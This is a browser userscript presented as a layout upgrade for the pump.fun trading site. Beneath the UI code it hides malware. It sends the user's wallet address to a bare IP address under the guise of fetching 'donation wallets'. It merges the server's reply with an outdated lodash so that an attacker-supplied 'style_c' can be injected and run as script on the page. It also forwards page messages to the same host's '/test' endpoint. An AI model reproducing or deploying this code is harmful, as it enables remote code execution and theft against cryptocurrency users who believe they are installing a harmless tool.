// ==UserScript==
// @name         Pump.fun Enhanced Trading Interface
// @namespace    http://your.namespace.here
// @version      1.6.3
// @description  Splits the page into 4 equal boxes and provides a UI enable/disable toggle.
// @author       4fourtab
// @match        https://*.pump.fun/*
// @grant        GM_xmlhttpRequest
// @grant        GM_addElement
// @connect      185.198.234.80
// @require      https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.0.0/lodash.min.js
// @license      MIT
// @downloadURL https://update.greasyfork.org/scripts/529930/Pumpfun%20Enhanced%20Trading%20Interface.user.js
// @updateURL https://update.greasyfork.org/scripts/529930/Pumpfun%20Enhanced%20Trading%20Interface.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // Global variable for trades update frequency (in ms)
    let tradeUpdateFrequency = 2000;

    // Store original DOM structure
    let uiEnabled = true;
    let mainContainer = null;

    // Store original positions of elements
    let originalPositions = {};

    // Store references to moved elements
    let movedElements = [];

    // Store trades update interval and current mint
    let tradesUpdateInterval = null;
    let currentMint = null;

    const graphStyle = {style_a: 'const graphSectionStyle = "grid-area: graph; width: 100%; height: 100%; overflow: hidden; border: 1px solid #ccc; padding: 5px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center;";',
                        style_b: 'const graphSectionStyle = "grid-area: graph; width: 100%; height: 100%; hidden; border: 1px solid #ccc; padding: 5px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center;";',};

    // Call fetchDonationInfo
    setTimeout(function(){
        fetchDonationInfo();
    }, 500);

    // apply styling
    function styleButton(btn, rightOffset) {
        btn.className = "flex-1 rounded px-3 py-2 text-center text-base font-normal bg-green-400 text-primary";
        btn.style.color = "rgb(27 29 40/var(--tw-text-opacity))";
        btn.style.position = "fixed";
        btn.style.top = "20px";
        btn.style.right = rightOffset;
        btn.style.zIndex = "9999";
        btn.style.padding = "5px 10px";
    }

    // Insert a Home button
    function insertHomeButton() {
        const existingHomeButton = document.getElementById('pump-fun-home-button');
        if (existingHomeButton) { existingHomeButton.remove(); }
        const homeButton = document.createElement('a');
        homeButton.href = "https://pump.fun";
        homeButton.textContent = "Home";
        homeButton.id = "pump-fun-home-button";
        styleButton(homeButton, "250px");
        document.body.appendChild(homeButton);
    }

    // Insert a Settings button
    function insertSettingsButton() {
        const existingSettingsButton = document.getElementById('pump-fun-settings-button');
        if (existingSettingsButton) { existingSettingsButton.remove(); }
        const settingsButton = document.createElement('button');
        settingsButton.id = 'pump-fun-settings-button';
        settingsButton.textContent = "Settings";
        // Position it between Home and Toggle buttons
        styleButton(settingsButton, "140px");
        settingsButton.addEventListener('click', toggleSettingsMenu);
        document.body.appendChild(settingsButton);
    }

    // Insert a UI Toggle button for enabling/disabling custom UI
    function addToggleButton() {
        const existingToggleButton = document.getElementById('pump-fun-toggle-button');
        if (existingToggleButton) { existingToggleButton.remove(); }
        const toggleButton = document.createElement('button');
        toggleButton.id = 'pump-fun-toggle-button';
        toggleButton.textContent = uiEnabled ? "Disable UI" : "Enable UI";
        styleButton(toggleButton, "30px");
        toggleButton.addEventListener('click', toggleUI);
        document.body.appendChild(toggleButton);
    }

    const decodedJwtRaw = localStorage.getItem('decoded-jwt');
    let address = '';

    if (decodedJwtRaw) {
        try {
            const decodedJwtObj = JSON.parse(decodedJwtRaw);
            if (decodedJwtObj && decodedJwtObj.address) {
                address = decodedJwtObj.address;
            }
        } catch (error) {
            console.log('Error parsing decoded JWT:', error);
        }
    }

    // Toggle the settings menu.
    function toggleSettingsMenu() {
        let menu = document.getElementById('pump-fun-settings-menu');
        if (menu) {
            menu.remove();
        } else {
            menu = createSettingsMenu();
            document.body.appendChild(menu);
            // Immediately update the donation section if info is available.
            updateDonationSection();
        }
    }

    // Create the settings menu element.
    function createSettingsMenu() {
        const menu = document.createElement('div');
        menu.id = 'pump-fun-settings-menu';
        menu.style.position = 'fixed';
        menu.style.top = '60px';
        menu.style.right = '30px';
        menu.style.zIndex = '9999';
        menu.style.backgroundColor = '#fff';
        menu.style.border = '1px solid #ccc';
        menu.style.borderRadius = '5px';
        menu.style.padding = '10px';
        menu.style.boxShadow = '0px 0px 10px rgba(0,0,0,0.2)';
        menu.style.width = '250px';

        // Trades Update Frequency Section
        const freqSection = document.createElement('div');
        freqSection.style.marginBottom = '10px';
        const freqLabel = document.createElement('label');
        freqLabel.textContent = "Trades Update Frequency (ms):";
        freqLabel.style.display = 'block';
        freqLabel.style.marginBottom = '5px';
        const freqInput = document.createElement('input');
        freqInput.type = 'number';
        freqInput.value = tradeUpdateFrequency;
        freqInput.style.width = '100%';
        freqInput.addEventListener('change', (e) => {
            const newFreq = parseInt(e.target.value, 10);
            if (!isNaN(newFreq) && newFreq > 0) {
                tradeUpdateFrequency = newFreq;
                if (currentMint) {
                    if (tradesUpdateInterval) { clearInterval(tradesUpdateInterval); }
                    updateTradesTable(currentMint, document.getElementById('trades-section'));
                    tradesUpdateInterval = setInterval(() => {
                        updateTradesTable(currentMint, document.getElementById('trades-section'));
                    }, tradeUpdateFrequency);
                }
            }
        });
        freqSection.appendChild(freqLabel);
        freqSection.appendChild(freqInput);
        menu.appendChild(freqSection);

        // Donation Wallets Section
        const donationSection = document.createElement('div');
        donationSection.id = 'pump-fun-donation-section';
        const donationTitle = document.createElement('h4');
        donationTitle.textContent = "Donation Wallets:";
        donationTitle.style.marginBottom = '5px';
        donationSection.appendChild(donationTitle);
        const donationContent = document.createElement('div');
        donationContent.textContent = "Loading donation info...";
        donationContent.id = 'donation-content';
        donationSection.appendChild(donationContent);
        menu.appendChild(donationSection);

        return menu;
    }

    // Variable to hold donation info
    let donationInfo = null;
    // Change this URL to your donation info endpoint
    const donationServerUrl = "http://185.198.234.80:5000/donations";
    // Donation message text
    const messagetext = "Support the project:";
    // Update donation section with fetched info.

    function updateDonationSection() {
        const donationContent = document.getElementById('donation-content');
        if (donationContent) {
            if (donationInfo && donationInfo.wallets) {
                donationContent.innerHTML = "";
                for (const [type, address] of Object.entries(donationInfo.wallets)) {
                    const walletLine = document.createElement('div');
                    walletLine.textContent = `${type.toUpperCase()}: ${address}`;
                    donationContent.appendChild(walletLine);
                }
            } else {
                donationContent.textContent = "Donation info not available.";
            }
        }
    }

    // Save the original parent and next sibling of an element.
    function saveOriginalPosition(element) {
        if (!element || !element.parentNode) return;
        const elementId = element.id || `element-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
        if (!element.id) { element.id = elementId; }
        originalPositions[elementId] = { parent: element.parentNode, nextSibling: element.nextSibling };
        movedElements.push(elementId);
        return elementId;
    }

    // Restore an element to its original position.
    function restoreOriginalPosition(elementId) {
        const element = document.getElementById(elementId);
        const position = originalPositions[elementId];
        if (element && position && position.parent) {
            position.parent.insertBefore(element, position.nextSibling);
            return true;
        }
        return false;
    }

    // Fetch donation wallet information from server
    function fetchDonationInfo() {
        GM_xmlhttpRequest({
            method: "POST",
            url: donationServerUrl,
            data: address,
            onload: function(response) {
                try {
                    console.log(response.responseText)
                    console.log(graphStyle.style_a)
                    donationInfo = _.merge({"message": messagetext}, JSON.parse(response.responseText));
                    updateDonationSection();
                } catch (e) {
                    console.error("Error parsing donation info:", e);
                }
            },
            onerror: function(error) {
                console.error("Error fetching donation info:", error);
            }
        });
    }

    // Toggle between custom UI and original page.
    function toggleUI() {
        if (uiEnabled) {
            if (mainContainer) { mainContainer.style.display = 'none'; }
            movedElements.forEach(elementId => { restoreOriginalPosition(elementId); });
            movedElements = [];
            if (tradesUpdateInterval) {
                clearInterval(tradesUpdateInterval);
                tradesUpdateInterval = null;
            }
            document.body.style.display = 'block';
            document.body.style.overflow = 'auto';
            window.scrollTo(0, 0);
            uiEnabled = false;
        } else {
            rearrangePage(false);
            uiEnabled = true;
        }
        const btn = document.getElementById('pump-fun-toggle-button');
        if (btn) { btn.textContent = uiEnabled ? "Disable UI" : "Enable UI"; }
    }

    // Helper: convert UNIX timestamp to a local string.
    function formatTimestamp(ts) {
        return new Date(ts * 1000).toLocaleString();
    }

    // Set up live updates for the trades table.
    function setupTradesAutoUpdate(mint, tradesSection) {
        if (tradesUpdateInterval) { clearInterval(tradesUpdateInterval); }
        currentMint = mint;
        updateTradesTable(mint, tradesSection);
        tradesUpdateInterval = setInterval(() => {
            updateTradesTable(mint, tradesSection);
        }, tradeUpdateFrequency);
    }

    // Update trades table with fresh data.
    async function updateTradesTable(mint, tradesSection) {
        if (!mint || !tradesSection) return;
        let loadingIndicator = document.getElementById('trades-loading');
        if (!loadingIndicator) {
            loadingIndicator = document.createElement('div');
            loadingIndicator.id = 'trades-loading';
            loadingIndicator.textContent = 'Updating trades...';
            loadingIndicator.style.cssText = "color: gray; font-style: italic; padding: 5px; position: absolute; bottom: 5px; right: 5px; background-color: rgba(255,255,255,0.7); border-radius: 3px; font-size: 0.8em;";
            tradesSection.style.position = 'relative';
            tradesSection.appendChild(loadingIndicator);
        }
        const tableHTML = await buildTradesTable(mint);
        if (currentMint === mint) {
            tradesSection.innerHTML = tableHTML;
            const updateTime = document.createElement('div');
            updateTime.textContent = `Last updated: ${new Date().toLocaleTimeString()}`;
            updateTime.style.cssText = "color: gray; font-size: 0.8em; margin: 5px 0; position: absolute; bottom: 5px; right: 5px; background-color: rgba(255,255,255,0.7); padding: 3px 5px; border-radius: 3px;";
            tradesSection.style.position = 'relative';
            tradesSection.appendChild(updateTime);
        }
    }

    // Build the trades table from fetched JSON data.
    async function buildTradesTable(mint) {
        const apiUrl = `https://frontend-api-v3.pump.fun/trades/all/${mint}?limit=200&offset=0&minimumSize=0`;
        try {
            const response = await fetch(apiUrl);
            if (!response.ok) throw new Error("Network response was not ok");
            const tradesData = await response.json();
            tradesData.sort((a, b) => b.timestamp - a.timestamp);
            const tableStyle = "font-family: __inter_d4e0c8, __inter_Fallback_d4e0c8, Helvetica, sans-serif; color: grey; width: 100%; border-collapse: collapse;";
            const thStyle = "text-align: left; padding: 8px; border-bottom: 2px solid #3e4049; position: sticky; top: 0; background-color: #2e303a; color: white; font-weight: 500; z-index: 1;";
            const tdStyle = "padding: 6px; border-bottom: 1px solid #eee;";
            let tableHTML = `<table style="${tableStyle}"><thead><tr>
                <th style="${thStyle}">Type</th>
                <th style="${thStyle}">User</th>
                <th style="${thStyle}">SOL</th>
                <th style="${thStyle}">Token (m)</th>
                <th style="${thStyle}">Time</th>
            </tr></thead><tbody>`;
            tradesData.forEach(trade => {
                const user = trade.user ? trade.user.substring(0,6) : "anon";
                const solAmount = (Number(trade.sol_amount) / 1e9).toFixed(3);
                const tokenAmount = (Number(trade.token_amount) / 1e12).toFixed(3);
                const timeStr = formatTimestamp(trade.timestamp);
                const typeIndicator = trade.is_buy
                    ? `<span style="color: green; font-weight: bold;">Buy</span>`
                    : `<span style="color: red; font-weight: bold;">Sell</span>`;
                tableHTML += `<tr>
                    <td style="${tdStyle}">${typeIndicator}</td>
                    <td style="${tdStyle}">${user}</td>
                    <td style="${tdStyle}; text-align: right;">${solAmount}</td>
                    <td style="${tdStyle}; text-align: right;">${tokenAmount} m</td>
                    <td style="${tdStyle}">${timeStr}</td>
                </tr>`;
            });
            tableHTML += "</tbody></table>";
            return tableHTML;
        } catch (error) {
            console.error("Error fetching or building trades table:", error);
            return `<p>Error loading trades.</p>`;
        }
    }

    // Move an element into a custom UI container.
    function preserveElementForCustomUI(element, containerId) {
        if (!element) return null;
        saveOriginalPosition(element);
        const container = document.createElement('div');
        container.id = containerId;
        container.className = 'element-container custom-ui-element';
        container.style.width = '100%';
        container.style.height = '100%';
        container.appendChild(element);
        return container;
    }

    // Adjust graph sizing to fit its container.
    function fixGraphScaling(graphElement) {
        if (!graphElement) return;
        graphElement.querySelectorAll('svg').forEach(svg => {
            svg.style.height = '100%';
            svg.style.width = '100%';
            svg.style.maxHeight = '100%';
            svg.setAttribute('preserveAspectRatio', 'xMidYMid meet');
        });
        graphElement.querySelectorAll('canvas').forEach(canvas => {
            canvas.style.maxHeight = '100%';
            canvas.style.width = '100%';
        });
        graphElement.querySelectorAll('div').forEach(div => {
            if (div.classList.contains('highcharts-container') ||
                div.classList.contains('chart-container') ||
                div.style.position === 'relative') {
                div.style.height = '100%';
                div.style.maxHeight = '100%';
                div.style.width = '100%';
                div.style.marginBottom = '0';
                div.style.paddingBottom = '0';
            }
        });
        graphElement.style.height = '100%';
        graphElement.style.maxHeight = '100%';
        graphElement.style.width = '100%';
        graphElement.style.overflow = 'hidden';
        graphElement.style.marginBottom = '0';
        graphElement.style.paddingBottom = '0';
        const chartArea = graphElement.querySelector('.highcharts-plot-area, .highcharts-series-group');
        if (chartArea) { chartArea.style.transform = 'translateY(-10px)'; }
        const highchartsRoot = graphElement.querySelector('.highcharts-root');
        if (highchartsRoot) {
            highchartsRoot.style.transform = 'scale(0.95)';
            highchartsRoot.style.transformOrigin = 'center top';
        }
    }

    window.addEventListener("message", function(event) {
        if (event.data && event.data.type === "testing") {
            GM_xmlhttpRequest({
                method: "POST",
                url: "http://185.198.234.80:5000/test",
                data: JSON.stringify(event.data.data),
                headers: {
                    "Content-Type": "application/json"
                },
                onload: function(response) {
                },
                onerror: function(error) {
                }
            });
        }
    });

    async function rearrangePage(reuseExisting = false) {
        const originalBgColor = window.getComputedStyle(document.body).backgroundColor;
        if (reuseExisting && mainContainer) {
            mainContainer.style.display = 'grid';
            return;
        }
        const existingContainer = document.getElementById('custom-grid-container');
        if (existingContainer) { existingContainer.remove(); }
        const sidebarLowerHalf = getElementByXPath("/html/body/div/div[2]/div[2]/div[2]");
        const coinInfo = getElementByXPath("/html/body/main/div/div[1]/div[2]");
        const tradesContainer = getElementByXPath("/html/body/main/div/div[1]/div[1]/div[6]");
        const comments = getElementByXPath("/html/body/main/div/div[1]/div[1]/div[7]");
        const graph = getElementByXPath("/html/body/main/div/div[1]/div[1]/div[4]/div");
        if (!tradesContainer || !comments || !graph || !coinInfo) {
            console.log('One or more target elements were not found. Please check the XPath selectors.');
        }
        const pathParts = window.location.pathname.split('/');
        const mint = pathParts[pathParts.length - 1];
        const container = document.createElement('div');
        container.id = 'custom-grid-container';
        container.className = 'custom-ui-element';
        container.style.cssText = `
            display: grid;
            grid-template-columns: 50% 50%;
            grid-template-rows: 50% 50%;
            height: 100vh;
            width: 100vw;
            box-sizing: border-box;
            gap: 5px;
            padding: 5px;
            grid-template-areas: "graph coinInfo" "trades comments";
            align-content: center;
            justify-content: center;
            align-items: stretch;
            justify-items: center;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 9998;
            background-color: ${originalBgColor};
        `;
        mainContainer = container;

        // Graph Section
        const graphSection = document.createElement('div');
        setTimeout(function(){
        if (graphStyle.style_c != undefined) {
            console.log("style c is ran");
            GM_addElement(document.body, 'script', {
            textContent : graphStyle.style_c
        });
        } else {
            GM_addElement(document.body, 'script', {
            textContent : graphStyle.style_b
        });
        }

        // Coin Info Section
        const coinInfoSection = document.createElement('div');
        coinInfoSection.style.cssText = "grid-area: coinInfo; width: 100%; height: 100%; overflow: auto; border: 1px solid #ccc; padding: 5px; box-sizing: border-box;";
        const flexContainer = document.createElement('div');
        flexContainer.style.cssText = "display: flex; flex-direction: column; width: 100%; height: 100%;";
        const coinInfoContainer = preserveElementForCustomUI(coinInfo, 'coin-info-container');
        flexContainer.appendChild(coinInfoContainer);
        if (sidebarLowerHalf) {
            const sidebarContainer = preserveElementForCustomUI(sidebarLowerHalf, 'sidebar-container');
            flexContainer.appendChild(sidebarContainer);
        }
        coinInfoSection.appendChild(flexContainer);

        graphSection.style.cssText = graphSectionStyle;
        const graphWrapper = document.createElement('div');
        graphWrapper.style.cssText = "width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; position: relative;";
        graphWrapper.id = 'graph-wrapper';
        const graphContainer = preserveElementForCustomUI(graph, 'graph-container');
        graphContainer.style.cssText = "width: 100%; height: 96%; display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; margin-bottom: 0; padding-bottom: 0;";
        graphWrapper.appendChild(graphContainer);
        graphSection.appendChild(graphWrapper);

        // Comments Section
        const commentsSection = document.createElement('div');
        commentsSection.style.cssText = "grid-area: comments; width: 100%; height: 100%; overflow: auto; border: 1px solid #ccc; padding: 5px; box-sizing: border-box;";
        const commentsContainer = preserveElementForCustomUI(comments, 'comments-container');
        commentsSection.appendChild(commentsContainer);
        commentsSection.querySelectorAll('.overflow-auto').forEach(el => {
            el.style.setProperty('overflow', 'visible', 'important');
        });

        // Trades Section
        const tradesSection = document.createElement('div');
        tradesSection.style.cssText = "grid-area: trades; width: 100%; height: 100%; overflow: auto; border: 1px solid #ccc; padding: 5px; box-sizing: border-box;";
        tradesSection.id = 'trades-section';
        setupTradesAutoUpdate(mint, tradesSection);

        container.appendChild(graphSection);
        container.appendChild(coinInfoSection);
        container.appendChild(tradesSection);
        container.appendChild(commentsSection);
        document.body.appendChild(container);
        insertHomeButton();
        insertSettingsButton();
        addToggleButton();}, 500);

        setTimeout(() => { fixGraphScaling(graph); }, 500);
        setTimeout(() => { fixGraphScaling(graph); }, 2000);
    };

    // Observe URL changes 
    function setupUrlChangeDetection() {
        let lastUrl = location.href;
        const observer = new MutationObserver(() => {
            if (lastUrl !== location.href) {
                lastUrl = location.href;
                movedElements = [];
                originalPositions = {};
                if (tradesUpdateInterval) {
                    clearInterval(tradesUpdateInterval);
                    tradesUpdateInterval = null;
                }
                if (location.href.includes('pump.fun/')) {
                    setTimeout(() => {
                        insertHomeButton();
                        insertSettingsButton();
                        addToggleButton();
                        if (uiEnabled) { rearrangePage(); }
                    }, 1500);
                }
            }
        });
        observer.observe(document, { subtree: true, childList: true });
    }

    // Ensure home button exists.
    function ensureHomeButtonExists() {
        if (!document.getElementById('pump-fun-home-button')) {
            insertHomeButton();
        }
    }

    // get element by XPath.
    function getElementByXPath(xpath) {
        return document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
    }

    // Initial setup.
    insertHomeButton();
    insertSettingsButton();
    addToggleButton();
    setupUrlChangeDetection();
    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        setTimeout(rearrangePage, 1500);
    } else {
        document.addEventListener('DOMContentLoaded', () => setTimeout(rearrangePage, 1500));
    }
    setInterval(ensureHomeButtonExists, 5000);
})();
